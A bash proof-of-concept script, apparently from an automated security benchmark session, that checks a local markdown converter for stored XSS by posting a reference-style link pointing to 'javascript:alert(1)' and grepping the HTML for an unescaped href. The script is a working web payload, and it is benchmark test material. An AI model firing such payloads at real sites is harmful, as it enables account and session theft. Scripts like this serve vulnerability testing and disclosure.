#!/bin/bash
# POC: Demonstrates Stored XSS vulnerability via reference-style markdown links with javascript: protocol URIs
# Target: ./repo
# Created: 2025-11-04T17:32:14.602Z
# Session: benchmark-XBEN-033-24-mhkubvue

# Stored XSS via Markdown Reference-Style Links with JavaScript Protocol
# This POC demonstrates how reference-style markdown links with javascript: 
# protocol are not properly sanitized and rendered as executable links

TARGET_URL="${1:-http://localhost:80/convert}"
OUTPUT_FILE=$(mktemp)

echo "[*] Testing Stored XSS via Markdown Reference-Style Links"
echo "[*] Target: $TARGET_URL"
echo ""

# Test payload: reference-style markdown link with javascript: protocol
PAYLOAD='[foo][bar]

[bar]: javascript:alert(1)'

echo "[*] Payload:"
echo "$PAYLOAD"
echo ""

# Send the request
echo "[*] Sending POST request with markdown_text parameter..."
HTTP_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  --data-urlencode "markdown_text=$PAYLOAD")

# Split response and status code
HTTP_CODE=$(echo "$HTTP_RESPONSE" | tail -n 1)
RESPONSE_BODY=$(echo "$HTTP_RESPONSE" | head -n -1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""

# Check if response contains the vulnerable javascript: URL
if echo "$RESPONSE_BODY" | grep -q 'javascript:alert(1)'; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] Response contains unescaped javascript: URL in href attribute"
    echo ""
    echo "[*] Vulnerable HTML excerpt:"
    echo "$RESPONSE_BODY" | grep -o '<a[^>]*href="javascript:[^"]*"[^>]*>[^<]*</a>' | head -n 3
    echo ""
    echo "[+] The javascript: protocol is preserved and will execute when clicked"
    exit 0
else
    echo "[-] No javascript: protocol found in response"
    echo ""
    echo "[*] Response body (first 500 chars):"
    echo "$RESPONSE_BODY" | head -c 500
    echo ""
    exit 1
fi